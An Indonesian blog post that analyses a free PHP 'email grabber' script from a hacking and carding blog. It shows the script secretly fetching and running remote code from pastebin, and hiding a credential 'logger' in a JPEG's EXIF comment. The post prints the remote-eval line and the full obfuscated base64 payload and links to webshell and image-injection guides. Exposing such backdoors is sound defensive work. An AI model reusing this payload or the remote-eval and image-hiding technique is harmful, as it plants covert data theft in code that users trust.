---
title: 'Logger Script ? You Must Know !'
date: 2016-10-25T02:31:00.000-07:00
draft: false
aliases: [ "/2016/10/logger-script-you-must-know.html" ]
tags : [Knowledge]
---

[![](https://4.bp.blogspot.com/-jnPTmSwLjLs/WA8DCud-nFI/AAAAAAAABR8/Ik2ykSsT8AIl1zomf74GHIZ2jAltth-HQCLcB/s320/wsl.png)](https://4.bp.blogspot.com/-jnPTmSwLjLs/WA8DCud-nFI/AAAAAAAABR8/Ik2ykSsT8AIl1zomf74GHIZ2jAltth-HQCLcB/s1600/wsl.png)

  
Haloo sobat setia pembaca yuzanotes  
Mumpung gw ada waktu luang nih, jadi dibikinlah topik ini, ya buat ngisi artikel blog saja, hehe  
  
Beberapa hari yang lalu gw lagi surfing" di google, ya biasalah ya nyari sesuatu yang baru, karena jujur saja gw lebih suka belajar otodidak di bandingkan harus dijelaskan dengan kata-kata.  
  
Akhirnya gw nyampe diblog [cr1p.blogspot.com](http://cr1p.blogspot.com/), dan gw tertarik dengan artikel yang ada di situ, semua artikel berbau dengan hacking, carding, dan dia membagikan script-script secara gratis. **Ingat** gan jangan langsung comot saja karena disitu serba gratis, **Jangan** percaya begitu saja. Apalagi belum tau siapa pemilik / pengelola si blog tersebut.  
_\*Biasanya kalo masih belum tau beginian pasti langsung dipake aja itu script, tanpa pikir panjang. Gak taunya scriptnya logger_  
**NB**: Ini berlaku di web manapun, intinya jangan mudah percaya  
  
Jaman sekarang udah pada canggih yakan, bahkan sesama temanpun bisa saling tikung menikung, apa hubungannya ? XD  
entahlah gan gw ini ngomong apa :v  
  
Gw inget video nya x'1n73ct a.k.a Achmad Ismail, dia ngasih tutorial nyisipin logger di file gambar, dan gw curiga kalo di scriptnya si Anas a.k.a 0x1999 ini jga ada logger gambarnya!  
  
Oke Back to Topik,  
Sekarang gw kasih contoh sample nya pada [artikel si Anas ini](http://cr1p.blogspot.co.id/2016/09/auto-grab-email-from-database-beta.html) dan script yang akan gw analisa [disini](http://pastebin.com/HxBuPKc4).  
Berikut ini beberapa contoh enkripsi yang patut kita waspadai :  
eval(gzinflate(base64\_decode('XXXXXXXXXXX')))  
eval(gzinflate(str\_rot13(base64\_decode('XXXXXXXXXXX'))))  
eval(gzinflate(base64\_decode(rawurldecode('XXXXXXXXXXX'))))  
eval(str\_rot13(gzinflate(str\_rot13(base64\_decode('XXXXXXXXXXX')))))  
_\*di atas adalah beberapa yg gw ambil_  
  
Sekarang kita lihat keseluruhan scriptnya  

Gw curiga dengan line 71 !

[![](https://2.bp.blogspot.com/-Uh0k4Q6UK6c/WA8PcwVtT0I/AAAAAAAABSM/GMnyQavSD0ISCj4g8o4txfzOJNx1VmSeACLcB/s640/Selection_002.jpg)](https://2.bp.blogspot.com/-Uh0k4Q6UK6c/WA8PcwVtT0I/AAAAAAAABSM/GMnyQavSD0ISCj4g8o4txfzOJNx1VmSeACLcB/s1600/Selection_002.jpg)

Disitu tertulis **eval(gzinflate(base64\_decode(file\_get\_contents('http://pastebin.com/raw/6PJ9Pj8F'))));** . Artinya script di enkripsi dengan gzinflate - base64, setelah itu coba buka url yang tercantum di situ **http://pastebin.com/raw/6PJ9Pj8F**  

[![](https://2.bp.blogspot.com/-w7Hfnv3z_3U/WA8RE0Pr-lI/AAAAAAAABSY/NTMPwe_4YfYQz-dcb8Bex1rK_N8r3-1aQCLcB/s640/Selection_003.jpg)](https://2.bp.blogspot.com/-w7Hfnv3z_3U/WA8RE0Pr-lI/AAAAAAAABSY/NTMPwe_4YfYQz-dcb8Bex1rK_N8r3-1aQCLcB/s1600/Selection_003.jpg)

Tugas kita sekarang mendecrypt script yang ada di pastebin menggunakan decrypter. bisa menggunakan tool yang dah bertebaran di google atau Shell IndoXploit yang sudah gw recode [disini](http://www.yuzac0der.id/2016/09/indoxploit-webshell-recoded-with-glow-effect.html) lebih simple.  
resultnya seperti ini, masih dalam enkripsi. Dan kali ini memakai str\_rot13 - gzinflate - str\_rot13 - base64\_decode  

[![](https://3.bp.blogspot.com/-ZMcA31JmAa8/WA8TzD9Vn-I/AAAAAAAABSo/AIQ1A2ISQDYSwWJhWN8r_nypZLYqFHK-wCLcB/s640/Selection_004.jpg)](https://3.bp.blogspot.com/-ZMcA31JmAa8/WA8TzD9Vn-I/AAAAAAAABSo/AIQ1A2ISQDYSwWJhWN8r_nypZLYqFHK-wCLcB/s1600/Selection_004.jpg)

Decrypt lagi sesuai alur enkripsinya, dan result seperti ini  

[![](https://1.bp.blogspot.com/-wqShvLfGKcw/WA8TzAz6kFI/AAAAAAAABSk/Lc2tmYbvFNE_H_-YIh8322kv_5lsED3HACEw/s640/Selection_005.jpg)](https://1.bp.blogspot.com/-wqShvLfGKcw/WA8TzAz6kFI/AAAAAAAABSk/Lc2tmYbvFNE_H_-YIh8322kv_5lsED3HACEw/s1600/Selection_005.jpg)

Boom !  
Seperti dugaanku sebelumnya, dia make exif UserComment untuk nyisipin loggernya  

[Baca Juga Cara Manipulasi File Php ke File Gambar](http://www.yuzac0der.id/2016/10/trik-inject-php-script-ke-file-gambar-jpg.html)

Buka url gambarnya di tab baru, sekilas memang tampak seperti gambar biasa saja, tapi didalam file tersebut ada loggernya bray :v Oke buka link nya, dan download

[![](https://4.bp.blogspot.com/-WAHBBkyo2So/WA8WJ8mKSFI/AAAAAAAABS0/vRrT4CRJGNIPi66wLSmMEtnawVH6CoBjwCLcB/s640/1_006.jpg)](https://4.bp.blogspot.com/-WAHBBkyo2So/WA8WJ8mKSFI/AAAAAAAABS0/vRrT4CRJGNIPi66wLSmMEtnawVH6CoBjwCLcB/s1600/1_006.jpg)

[![](https://2.bp.blogspot.com/-qg_e2qI-v4g/WA8WJ3Db4cI/AAAAAAAABS4/UtIaDIxGTBYNbvaPoHL9WLe99xHARAEOwCLcB/s640/Selection_007.jpg)](https://2.bp.blogspot.com/-qg_e2qI-v4g/WA8WJ3Db4cI/AAAAAAAABS4/UtIaDIxGTBYNbvaPoHL9WLe99xHARAEOwCLcB/s1600/Selection_007.jpg)

Analisa kali ini make exif tool ya gan, sist, buat bongkar gambarnya. gw taruh file gambarnya di desktop, biar mudah.

Jika belum terinstall exif tool, lihat pada [artikel ini](http://www.yuzac0der.id/2016/10/trik-inject-php-script-ke-file-gambar-jpg.html)

  

Oke here we go...

  

yuza@m1x:~/Desktop$ exif pacman.jpg

[![](https://1.bp.blogspot.com/-0m4PTZTWWMw/WA8X6CpXHeI/AAAAAAAABTA/tO-CvsUQRN8QNW_rzaa3x8gBe4nEjrgoACLcB/s640/Selection_008.jpg)](https://1.bp.blogspot.com/-0m4PTZTWWMw/WA8X6CpXHeI/AAAAAAAABTA/tO-CvsUQRN8QNW_rzaa3x8gBe4nEjrgoACLcB/s1600/Selection_008.jpg)

Kita lihat disitu terdapat Tag User Comment yang Value nya mencurigakan. Sekarang kita buka tag User Comment dengan command begini

  

yuza@m1x:~/Desktop$ exif -t=UserComment pacman.jpg

[![](https://4.bp.blogspot.com/-5s90eZVnNkc/WA8Y7Zp4ZjI/AAAAAAAABTI/GfmrkzO33eEYMm1U6aB3jlLPjhUdrVaKACPcB/s640/Selection_009.jpg)](https://4.bp.blogspot.com/-5s90eZVnNkc/WA8Y7Zp4ZjI/AAAAAAAABTI/GfmrkzO33eEYMm1U6aB3jlLPjhUdrVaKACPcB/s1600/Selection_009.jpg)

Yess.. dah keluar scriptnya, sekarang kita decrypt, dengan enkripsi base64\_decode, dan begini hasilnya  

[![](https://4.bp.blogspot.com/-HjIOIYgwm08/WA8bTYo2B7I/AAAAAAAABTQ/ErmOjC_7dfQpGG6N-x5R8D6ArDaG6E7DgCLcB/s640/Selection_010.jpg)](https://4.bp.blogspot.com/-HjIOIYgwm08/WA8bTYo2B7I/AAAAAAAABTQ/ErmOjC_7dfQpGG6N-x5R8D6ArDaG6E7DgCLcB/s1600/Selection_010.jpg)

Script:  

> eval(str\_rot13(gzinflate(base64\_decode('rVZbj6NGGn1fKf9h33qiyQNge6ZRFCnYgLmVwaZc2H5pATEGbHNxQ5ni1+erck/P7CSryUr7UEJQ1Hc553wHfqcxfclupw9PSX5K89NLnb++3o407p5+kX7+9ad//f7+QkuzlFWXl9vxmByzp1/+/dgXty/HW5ocT3Dsg3h6Kyr2oa6y26fpS3trkvb24Sna2iVZSx2hq+dqa5zq9bRb4J55jv5xsTXSFp/Zgq5OC9Nf3hx7qBwtgfdPZF0WLWZSja2Pi0BNkBMOi/uZ1ooxg+sdOTMJueTjAndnuB9rZSYRjHpPsVQ3iCzP6YvaCRtC/Wvlpmxhl1SDRbBW1Fi98HuioPGwXpWHsKSL4cw8N8pJaBRkE7F2a7DmXhZoVPN2PX3eK295JtGJ4PAOtRX1XW4I4zFl1uK+QGu4j/2imRg8L6tHTbq5vshdu3YGZ0rIIe0VVDSjdEI4lDxR06yvHVG33OBz4TmQW8RlAz/bun5WK+GA3Kgh9+lzi0MKuHTeqF4QtkUvB1hQn9SIfR322nutnIuG10gPpehz7YvzoqfA/899zLF47FfOrGxdvWu3rERL2B9RWmOb95R7jiz6QSPLEK99q6W3kddOZIEj1IACnyLlG5yvq/Id5/s5rWNfhvzvsdyJXdYhj2XMGixwuLZOdKpcgWMqcGUqx4bfK55zlkVdDM5htYd8uHLODGrgWpEQ52tigF5AQ9vHM8+JMrT

Wait wait...  
Kalo dilihat dari strukturnya, ada struktur yang kurang, tidak ada penutup tag enkripsi. Hmm..  
Sepertinya ada yang salah dari hasil exif user comment pada file pacman.jpg tadi. toolnya gabisa nampilin smua code yang ada di dalamnya, hanya sebagian yang tampil.  
  
Kita coba gunakan tool ke 2 yaitu exiv2, command gini di terminal  
  

yuza@m1x:~/Desktop$ exiv2 pr pacman.jpg

  
**BOOM !**  
  
File name       : pacman.jpg  
File size       : 6447 Bytes  
MIME type       : image/jpeg  
Image size      : 140 x 140  
Camera make     :  
Camera model    :  
Image timestamp :  
Image number    :  
Exposure time   :  
Aperture        :  
Exposure bias   :  
Flash           :  
Flash bias      :  
Focal length    :  
Subject distance:  
ISO speed       :  
Exposure mode   :  
Metering mode   :  
Macro mode      :  
Image quality   :  
Exif Resolution :  
White balance   :  
Thumbnail       : None  
Copyright       :  
Exif comment    : ZXZhbChzdHJfcm90MTMoZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJ3JWWmJqNk5HR24xZktmOWgzM3FpeVFOZ2U2WlJGQ25ZZ0xtVndhWmMySDVwQVRFR2JITnhRNW5pMStlcmNrL1A3Q1NyeVVyN1VFSlExSGM1NTN3SGZxY3hmY2x1cHc5UFNYNUs4OU5MbmIrKzNvNDA3cDUra1g3KzlhZC8vZjcrUWt1emxGV1hsOXZ4bUJ5enAxLysvZGdYdHkvSFc1b2NUM0RzZzNoNkt5cjJvYTZ5MjZmcFMzdHJrdmIyNFNuYTJpVlpTeDJocStkcWE1enE5YlJiNEo1NWp2NXhzVFhTRnAvWmdxNU9DOU5mM2h4N3FCd3RnZmRQWkYwV0xXWlNqYTJQaTBCTmtCTU9pL3VaMW9veGcrc2RPVE1KdWVUakFuZG51QjlyWlNZUmpIcFBzVlEzaUN6UDZZdmFDUnRDL1d2bHBteGhsMVNEUmJCVzFGaTk4SHVpb1BHd1hwV0hzS1NMNGN3OE44cEphQlJrRTdGMmE3RG1YaFpvVlBOMlBYM2VLMjk1SnRHSjRQQU90UlgxWFc0STR6RmwxdUsrUUd1NGovMmltUmc4TDZ0SFRicTV2c2hkdTNZR1owcklJZTBWVkRTamRFSTRsRHhSMDZ5dkhWRzMzT0J6NFRtUVc4UmxBei9idW41V0srR0EzS2doOStsemkwTUt1SFRlcUY0UXRrVXZCMWhRbjlTSWZSMzIybnV0bkl1RzEwZ1BwZWh6N1l2em9xZkEvODk5ekxGNDdGZk9yR3hkdld1M3JFUkwyQjlSV21PYjk1UjdqaXo2UVNQTEVLOTlxNlcza2RkT1pJRWoxSUFDbnlMbEc1eXZxL0lkNS9zNXJXTmZodnp2c2R5SlhkWWhqMlhNR2l4d3VMWk9kS3BjZ1dNcWNHVXF4NGJmSzU1emxrVmRETTVodFlkOHVITE9ER3JnV3BFUTUydGlnRjVBUTl2SE04K0pNclRrUEFycytiT3ZHZ3JVaDY0bytielcweFRScm90Q1ZWL0ttdVZjMmxlT2Z5UkwzV0lKT3Y0dUorZzZKZHRNQzBZMjdqYUE2Y1NmN1FMajFSall3YkMxT2xJNGRsWU05TWN0bGt0WEVWekhybG55SE5pMHpxRWxaN0hBMDJ4YnlDZHdnWHpwenZRL2s1VzBRekFUOVdVVkx6RFh1OGJxbUd0enFnWC9EOTB6elRabExiUXV2bTF0emd2ZDBydWxGUzd0VFVoSXNPbS94MmxCRzFIVHE4N3JPbC9SZHpXdTllU0x2a2JQMFVSK0c0ZEpyY2c5OE5NMUN2c2t1THNMUFgyalFXMUU5NjhhOVJRN2I3bTJZZVlYUStzYlVuZ2dvYTB2TjZwdkJMNm0yNXFsVzExSGxtWGgzYWZ4L0xMU2dsaDZMTTRGWnRkR3NTWEJoV1FEajZUOE1rZUVBYll1NTh5K1YvZ1p2TW1RbTBCd3IwTDl4Zjd5L09OVlNqdVl6Ny9OQTdVZi81S0QrWDB6MFNiZ0h3UFpXTjJja2p6Q29ReSs4ZHJnOE5wYzRWM3EvMC81SzhmcmRsak01aXR5K3hSODU3b0xtaHhoRXUvTWdjZjdUQUpmSmRqT0dzWHFibkFtMm9LL2NUK090Umx5ak5SVCt0WE40Znc4NTU2aW5zaWQxMkh3K2ZzRE9KWDR1NkRUcFdGSERxdzY0bHBoQ0pZNjF5MDVCSjBDYnNsUVlidm5YaVJpRCtoU0s5SW5zcEdoWjZPdkF2RCtNZVR4anpxV2UvQ3ZVK3RvUlhXWkFmL1N4N2VjSitScVY4OXAyU09HUGVWZVdJRVB6YW1mZ0IrWGMvcGNFRHI5VVQwNUFTNHN5VGJ0d1RaaG5rekREbTJZUmN1VmJkT0VHWnNERGpBamFSMTBRNHVmTTNqL3ZkOTlzQnBxeHdaT3d4anhHUlhmS3BnM09vZythM01GZUlLSFlEdmZCWVJqVGVFTWJTOGtKVEJmQkJzcE1sY0orQUxkTFVWZjBtMnJkd3R6UlVXZkk1bzBJNU9RMlVFc2lMODFwbTNBWTZlangyZEJzWklJU3ltdkViZzUxWW9Pc1dhRFIwbDJXSHNnN3VFejJjS0YvZ09Od0lLYU85QkpVZ0cyeU5VVHdHNXIyRVpON3VBUG9JczZpTnFkeVVSdm5qUHJxK3NHYXZWSDRhZEt5OXBRdlhPUDRSN1FYRG9LMzNDcDJSNCs3UzhxK0F2Z2NwbkZ0YUxHNEhGQ1AvdUpCdDkwcS9ER0h1S2ZzOE9TWFBkS2xPeGozaWNSZlVWNEZpTWxuS0RsSXhkNEpxdHBSMkVXR01kK0gvc0p6R05HNG9hQ0J4WU45ZUcvd09wMlFSU0RqNmVOc3VsZ1pvNkVQbkJySnhIUG1Yd1RONFBaQWgvTnpvSURjQmJ3dnF2QWZHeGp6MjNad1JSbnhYOEZlQnVQZmFnVnJYOTgxMU1Kc0FFOUh2SUc5eVhQd3ozdW5ZL1lnSE15Nzcyc3RpdTZYNjhVRFlMTkovK2NsN2Y1L1R0ZUJ1UUlQNmV1T2FSaVpoKzkvSmlYTlhqSGhQdU13YnlSNWZzUlBOOVVMNTdiRk5xUSt0bzEycyt4OUVXWE9WTGF2Z1ZmK0phRHc3YkwrWDhhb2VWZk5UMjJQY1M5ZXFaZlFqMzBEZHV2ZW43RGRoOFlmVDJHeC8rRy9lUDVsN21DdUFQODh5aWhWRGxxUHIvNzAvM1lTN1ZKT0o2L1BmM00veXovQkE9PScpKSkpOw==  

[![](https://4.bp.blogspot.com/-xOhAkNn2Jzo/WA8dl0gefPI/AAAAAAAABTk/gy1xPThhaVg0ZApkQxTxmM48yjfJ583oQCEw/s640/Selection_011.jpg)](https://4.bp.blogspot.com/-xOhAkNn2Jzo/WA8dl0gefPI/AAAAAAAABTk/gy1xPThhaVg0ZApkQxTxmM48yjfJ583oQCEw/s1600/Selection_011.jpg)

Akhirnya kebuka juga codenya..  
Code sudah di dapatkan, so langsung decrypt codenya gan,sist, dengan enkripsi base64\_decode, hasilnya ternyata masih dalam bentuk enkripsi, kali ini memakai str\_rot13 - gzinflate - base64\_decode  

[![](https://3.bp.blogspot.com/-9rvpSF45dZE/WA8f0NJa3SI/AAAAAAAABTs/-DHmcNVGxjIEB1vbV7vE2WAuHJgvR0ebQCPcB/s1600/Selection_012.jpg)](https://3.bp.blogspot.com/-9rvpSF45dZE/WA8f0NJa3SI/AAAAAAAABTs/-DHmcNVGxjIEB1vbV7vE2WAuHJgvR0ebQCPcB/s1600/Selection_012.jpg)

Dekrip lagi gan sesuai alurnya. Dan hasilnya  

[![](https://3.bp.blogspot.com/-jmXxVQyNC1E/WA8f0k6rjtI/AAAAAAAABTw/ultoC2xkT2kZIVlsB4Jl3Ew60MTpy_hFQCPcB/s1600/Selection_013.jpg)](https://3.bp.blogspot.com/-jmXxVQyNC1E/WA8f0k6rjtI/AAAAAAAABTw/ultoC2xkT2kZIVlsB4Jl3Ew60MTpy_hFQCPcB/s1600/Selection_013.jpg)

Bazriing :v ternyata masih dengan bentuk enkripsi, kali ini dengan base64\_decode  
Jangan Menyerah pokoknya :v Decrypt teruuuss  
  
Dannn.... **Boom !**  
Kelihatan sudah Loggernya, seperti gambar dibawah ini  

[![](https://4.bp.blogspot.com/-I_TlZiV2bSQ/WA8f1EUUK1I/AAAAAAAABT0/9pdb4--JeqcxVAkeSbUtho0_RiozKzpcgCPcB/s640/1_014.jpg)](https://4.bp.blogspot.com/-I_TlZiV2bSQ/WA8f1EUUK1I/AAAAAAAABT0/9pdb4--JeqcxVAkeSbUtho0_RiozKzpcgCPcB/s1600/1_014.jpg)

Dari situ kita bisa lihat code-code loggernya beserta anakannya, kita juga bisa lihat emailnya disitu  tercantum **syedich@yahoo.com**. Untuk full script loggernya bisa dilihat [disini](http://pastebin.com/bq802Pyf)  
  
CATATAN :  

SEMUA BAHAN MATERI YANG GW GUNAKAN DIATAS TIDAK BERMAKSUD MENJATUHKAN SIAPAPUN, ARTIKEL INI HANYA UNTUK PEMBELAJARAN SAJA YANG DI AMBIL DARI REALITA KERASNYA DUNIA CYBER UNDERGROUND TANPA REKAYASA

  
Salam dari w,  
m1x - Eldersc0de Family  
Semoga Bermanfaat :)